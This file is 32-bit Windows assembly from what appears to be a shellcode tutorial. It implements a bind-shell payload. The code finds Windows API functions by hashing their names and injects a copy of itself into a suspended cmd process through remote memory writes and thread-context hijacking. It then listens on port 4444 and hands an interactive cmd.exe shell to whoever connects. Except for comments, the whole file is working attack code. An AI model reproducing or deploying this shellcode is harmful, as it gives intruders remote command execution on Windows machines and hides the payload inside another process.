; portbind.asm -  Code from ProjectShellcode Tutorials
[SECTION .text]

BITS 32

global _start

_start:
    jmp start_asm
    
    ; DEFINE FUNCTIONS
    
    ; ======== Function: find_kernel32
    find_kernel32:
        push esi
        xor eax, eax
        mov eax, [fs:eax+0x30]
        test eax, eax
        js find_kernel32_9x
    find_kernel32_nt:
        mov eax, [eax+0x0C]
        mov esi, [eax+0x1C]
        lodsd
        mov eax, [eax+0x08]
        jmp find_kernel32_finished
    find_kernel32_9x:
        mov eax, [eax+0x34]
        lea eax, [eax+0x7C]
        mov eax, [eax+0x3C]
    find_kernel32_finished:
        pop esi
        ret
        
    ; ======= Function: find_function
    find_function:
        pushad
        mov ebp, [esp+0x24]
        mov eax, [ebp+0x3C]
        mov edx, [ebp+eax+0x78]
        add edx, ebp
        mov ecx, [edx+0x18]
        mov ebx, [edx+0x20]
        add ebx, ebp
    find_function_loop:
        jecxz find_function_finished
        dec ecx
        mov esi, [ebx+ecx*4]
        add esi, ebp
        
    compute_hash:
        xor edi, edi
        xor eax, eax
        cld
    compute_hash_again:
        lodsb
        test al, al
        jz compute_hash_finished
        ror edi, 0x0D
        add edi, eax
        jmp compute_hash_again
    compute_hash_finished:
    find_function_compare:
        cmp edi, [esp+0x28]
        jnz find_function_loop
        mov ebx, [edx+0x24]
        add ebx, ebp
        mov cx, [ebx+2*ecx]
        mov ebx, [edx+0x1C]
        add ebx, ebp
        mov eax, [ebx+4*ecx]
        add eax, ebp
        mov [esp+0x1C], eax
    find_function_finished:
        popad
        ret
        
    ; ======== Function: resolve_symbols_for_dll
    resolve_symbols_for_dll:
        lodsd
        push eax
        push edx
        call find_function
        mov [edi], eax
        add esp, 0x08
        add edi, 0x04
        cmp esi, ecx
        jne resolve_symbols_for_dll
    resolve_symbols_for_dll_finished:
        ret

    ; ======= Function: fork
    fork:
    	; ======= Create STARTUPINFO object ==========================
	int 3
	xor eax, eax		; Zero EAX
	xor ecx, ecx		; Zero ECX
	mov cl, 0x54		; The size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
	sub esp, ecx		; Allocate stack space for the two structures
	mov edi, esp		; set edi to point to the STARTUPINFO structure
	push edi		; Preserve EDI on the stack as it will be modified by the following instructions
	rep stosb		; Repeat storing zero at the buffer starting at edi until ecx is zero
	pop edi			; restore EDI to its original value
	mov byte[edi], 0x44	; cb = 0x44 (size of the structure)

	; Create Suspended Process 
	lea esi, [edi+0x44]	; Load the effective address of the PROCESS_INFORMATION structure into ESI
	push esi		; Push the pointer to the lpProcessInformation structure
	push edi		; Push the pointer to the lpStartupInfo structure
	push eax		; lpCurrentDirectory = NULL
	push eax		; lpEnvironment = NULL
	push 0x04		; dwCreationFlags = CREATE_SUSPENDED
	push eax		; bInheritHandles = FALSE
	push eax		; lpThreadAttributes = NULL
	push eax		; lpProcessAttributes = NULL
	push dword [ebp+0x3C]	; lpCommandLine = "cmd"
	push eax		; lpApplicationName = NULL
	call [ebp+0x08]		; Call CreateProcess

	; Begin GetThreadContext
	sub esp, 0x0400		; Create 1024 bytes for CONTEXT object on stack
	push 0x010007		; CONTEXT ContextFlags = CONTEXT_FULL
	push esp		; lpContext
	push dword [esi+0x04]	; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
	call [ebp+0x14]		; Call GetThreadContext

	; Begin VirtualAllocEx
	push 0x40		; flProtect = PAGE_EXECUTE_READWRITE
	push 0x1000		; flAllocationType = MEM_COMMIT
	push 0x5000		; dwSize = 20kb
	push 0			; lpAddress = NULL
	push dword [esi]	; hProcess = PROCESS_INFORMATION.hProcess = ESI
	call [ebp+0x18]		; Call VirtualAllocEx

	; Setup CONTEXT object for thread change
	mov ebx, eax		; Move buffer address to EBX
	;add ebx, 0x100		; EIP = buf + 2 (jmp instruction)
	mov [esp+0xB8], ebx	; CONTEXT object offset 0xB8 = EIP
	mov [esp+0xB4], ebx	; CONTEXT object offset 0xB4 = EIP

	; Overwrite Fork Call
	mov ecx, [ebp-0x10]		; Fork Return
	mov dword [ecx-5], 0x90909090	; Overwrite first 4 bytes of call
	mov byte [ecx-1], 0x90		; Overwrite last byte of call
	sub ecx, 0x1A9			; Bytes to subtract to reach beginning of shellcode, change as needed

	; Begin WriteProcessMemory
	push 0			; lpNumberOfBytesWritten = NULL
	push 0x1000		; nSize = 0x1000
	push ecx		; lpBuffer = ECX
	push eax		; lpBaseAddress = EAX
	push dword [esi]	; hProcess = PROCESS_INFORMATION.hProcess = ESI
	call [ebp+0x1C]		; Call WriteProcessMemory

	; Begin SetThreadContext
	push esp		; lpContext = CONTEXT structure
	push dword [esi+0x04]	; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
	call [ebp+0x20]		; Call SetThreadContext

	; Begin ResumeThread
	push dword [esi+0x04]	; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
	call [ebp+0x24]		; Call ResumeThread

	; Begin TerminateProcess
	xor eax, eax
	dec eax
	push eax
	call [ebp+0x10]		; Call TerminateProcess
	ret

    
    ; ======= Constants
    locate_kernel32_hashes:
        call locate_kernel32_hashes_return
        
        ; LoadLibraryA - EBP + 0x04
        ; db 0x8E
        ; db 0x4E
        ; db 0x0E
        dd 0xEC0E4E8E
        
        ; CreateProcessA - EBP + 0x08
        ; db 0x72
        ; db 0xFE
        ; db 0xB3
        dd 0x16B3FE72
        
        ; ExitProcess - EBP + 0x0C
        ; db 0x7E
        ; db 0xD8
        ; db 0xE2
        dd 0x73E2D87E

	; TerminateProcess - EBP + 0x10
	; db 0x83
	; db 0xB9
	; db 0xB5
	dd 0x78B5B983

	; GetThreadContext - EBP + 0x14
	; db 0xD2
	; db 0xC7
	; db 0xA7
	dd 0x68A7C7D2

	; VirtualAllocEx - EBP + 0x18
	; db 0x9C
	; db 0x95
	; db 0x1A
	dd 0x6E1A959C

	; WriteProcessMemory - EBP + 0x1C
	; db 0xA1
	; db 0x6A
	; db 0x3D
	dd 0xD83D6AA1

	; SetThreadContext - EBP + 0x20
	; db 0xD3
	; db 0xC7
	; db 0xA7
	dd 0xE8A7C7D3

	; ResumeThread - EBP + 0x24
	; db 0x88
	; db 0x3F
	; db 0x4A
	dd 0x9E4A3F88
        
    ; locate_ws2_32_hashes:
        ; WSASocketA - EBP + 0x28
        ; db 0xD9
        ; db 0x09
        ; db 0xF5
        dd 0xADF509D9
        
        ; bind - EBP + 0x2C
        ; db 0xA4
        ; db 0x1A
        ; db 0x70
        dd 0xC7701AA4
        
        ; listen - EBP + 0x30
        ; db 0xA4
        ; db 0xAD
        ; db 0x2E
        dd 0xE92EADA4
        
        ; accept - EBP + 0x34
        ; db 0xE5
        ; db 0x49
        ; db 0x86
        dd 0x498649E5
        
        ; WSAStartup - EBP + 0x38
        ; db 0xCB
        ; db 0xED
        ; db 0xFC
        dd 0x3BFCEDCB
        
    ; ======= Main
    start_asm:
        sub esp, 0x84                   ; Allocate space on stack for function addresses
        mov ebp, esp                    ; Set ebp as frame ptr for relative offset on stack
        call find_kernel32              ; Find base address of kernel32.dll
        mov edx, eax                    ; Store base address of kernel32.dll in EDX
        
        ; Resolve kernel32 symbols
        jmp short locate_kernel32_hashes    ; Locate address of our hashes
    locate_kernel32_hashes_return:          ; Define label to returnt to this code
        pop esi                             ; Get constants address from stack
        lea edi, [ebp+0x04]                 ; This is where we store our function addresses
        mov ecx, esi
        add ecx, 0x24			    ; Length of kernel32 hash list
        call resolve_symbols_for_dll
        
        ; Resolve ws2_32 symbols
        add ecx, 0x14                       ; Length of ws2_32 hash list
        
        ; Create "ws2_32_ string on the stack in reverse
        xor eax, eax
        mov ax, 0x3233                      ; "23"
        push eax                            ; 0x00003233 = "\x0023"
        push dword 0x5F327377               ; 0x5F327377 = "_2sw"
        mov ebx, esp                        ; EBX now points to string "ws2_32"
        
        push ecx
        push edx
        push ebx
        call [ebp+0x04]                     ; Call LoadLibraryA(ws2_32)
        
        pop edx                             ; EDX now holds location of ws2_32.dll
        pop ecx
        mov edx, eax
        call resolve_symbols_for_dll
        
        initialize_cmd:                     ; push the string "cmd" onto the stack
            mov eax, 0x646D6301
            sar eax, 0x08
            push eax
            mov [ebp+0x3C], esp
	
	call fork
            
        WSAStartup:                         ; Initialize networking
            xor edx, edx                    ; Make some stack space
            mov dh, 0x03                    ; sizeof(WSDATA) is 0x190
            sub esp, edx
            
            ; Initialize winsock
            push esp                        ; Use stack for WSADATA
            push 0x02                       ; wVersionRequested
            call [ebp+0x38]                  ; call WSAStartup

	    add esp, 0x0300		    ; Move esp over WSAData
            
        create_socket:
            xor eax, eax                    ; Zero EAX
            push eax                        ; dwFlags = 0
            push eax                        ; g = 0
            push eax                        ; lpProtocolInfo = NULL
            push eax                        ; protocol = 0
            inc eax                         ; EAX = 1
            push eax                        ; type = 1
            inc eax                         ; EAX = 2
            push eax                        ; af = 2
            call [ebp+0x28]                 ; call WSASocket
            mov esi, eax                    ; Save the socket file descriptor in ESI
            
        bind:
            xor eax, eax                    ; Zero EAX
            xor ebx, ebx                    ; Zero EBX
            push eax
            push eax
            push eax                        ; sin addr of SOCKADDR Structure
            mov eax, 0x5C110102             ; Set the high order bytes of EAX to the port that is to be bound to and the low order bytes to AF INET.
            dec ah                          ; Fix the sin family attribute such that it is set appropriately
            push eax                        ; sin port of SOCKADDR Structure
            mov eax, esp                    ; Set EAX to point to point to SOCKADDR Structure on stack
            mov bl, 0x10                    ; Set the low order byte of EBX to 0x10 to signify the size of the structure.
            push ebx                        ; namelen = 0x10
            push eax                        ; name = SOCKADDR Structure on stack
            push esi                        ; descriptor = WSASocket file descriptor
            call [ebp+0x2C]                 ; call bind
        
        listen:
            push ebx                        ; backlog = 0x10
            push esi                        ; descriptor = WSASocket file descriptor
            call [ebp+0x30]                 ; call listen
            
        accept:
            push ebx                        ; push 0x10 to stack
            mov edx, esp                    ; Save pointer to 0x10 on stack
            sub esp, ebx                    ; Allocate 16 bytes of stack space for use as output addr to accept call
            mov ecx, esp                    ; Save pointer to output buffer
            push edx                        ; addrlen = 0x10
            push ecx                        ; addr = Output structure on stack
            push esi                        ; descriptor = WSASocket file descriptor
            call [ebp+0x34]                 ; call accept
	    mov esi, eax		    ; Save the client file descriptor in ESI
            
        initialize_process:
            xor ecx, ecx                    ; Zero ECX
            mov cl, 0x54                    ; Set the lower order bytes of ECX to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
            sub esp, ecx                    ; Allocate stack space for the two structures
            mov edi, esp                    ; set edi to point to the STARTUPINFO structure
            push edi                        ; Preserve EDI on the stack as it will be modified by the following instructions
	zero_structs:
            xor eax, eax                    ; Zero EAX
            rep stosb                       ; Repeat storing zero at the buffer starting at edi until ecx is zero
            pop edi                         ; restore EDI to its original value
        initialize_structs:
            mov byte[edi], 0x44             ; cb = 0x44 (size of the structure)
            inc byte[edi+0x2D]              ; Increment byte at offset of 0x2D to make dwFlag = 0x00000100 = STARTF_USESTDHANDLES
            push edi                        ; Preserve EDI
            mov eax, esi                    ; Set EAX to the client file descriptor that was returned by accept
            lea edi, [edi+0x38]             ; Load the effective address of the hStdInput attribute in the STARTUPINFO structure
            stosd                           ; Set the hStdInput Attribute to the file descriptor returned from accept
            stosd                           ; Set the hStdOutput Attribute to the file descriptor returned from accept
            stosd                           ; Set the hStdError Attribute to the file descriptor returned from accept
            pop edi                         ; Restore EDI
        execute_process:
            xor eax, eax                    ; Zero EAX
            lea esi, [edi+0x44]             ; Load the effective address of the PROCESS_INFORMATION structure into ESI
            push esi                        ; Push the pointer to the lpProcessInformation structure
            push edi                        ; Push the pointer to the lpStartupInfo structure
            push eax                        ; lpStartupDirectory = NULL
            push eax                        ; lpEnvironment = NULL
            push eax                        ; dwCreationFlags = 0
            inc eax                         ; EAX = 1
            push eax                        ; bIngeritHandles = True
            dec eax                         ; EAX = 0
            push eax                        ; lpThreadAttributes = NULL
            push eax                        ; lpProcessAttributes = NULL
            push dword [ebp+0x3C]           ; lpCommandLine = "cmd"
            push eax                        ; lpApplicationName = NULL
            call [ebp+0x08]                 ; call CreateProcessA
            
        exit_process:
            call [ebp+0x0C]
